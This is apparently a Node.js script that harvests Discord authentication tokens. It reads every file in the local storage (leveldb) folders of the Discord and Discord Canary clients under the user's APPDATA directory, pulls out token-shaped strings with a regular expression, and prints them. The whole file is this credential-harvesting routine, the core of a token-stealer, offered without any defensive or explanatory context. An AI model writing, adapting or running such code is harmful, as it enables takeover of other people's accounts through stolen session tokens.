
const { promises: fs } = require("fs");
const appdata = process.env.APPDATA 

async function getTokens(path) {
    if (path) {
        const set = `${path}\\Local Storage\\leveldb`
        const tokens = []
        
        try {
            await fs.access(set)
        } catch (error) {
            path = null
        }

        if (!path) return []

        files = await fs.readdir(set)
        
        for (const file of files) {
            if (file == "LOCK") continue
            const content = await fs.readFile(`${set}\\${file}`, "utf8")
                
            if (content) {
                (content.match(/[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-​]{27}/g)||[]).forEach(token => {
                    if (tokens.indexOf(token)==-1) tokens.push(token)
                })

            }
        }
        return tokens
    } else {
        const tokens = []

        for (const paths of [`${appdata}\\discordcanary`, `${appdata}\\discord`]) {
            for (const token of await getTokens(paths)) if (tokens.indexOf(token)==-1) tokens.push(token)
        }
        
        return tokens
    }
    
}

getTokens().then(console.log)
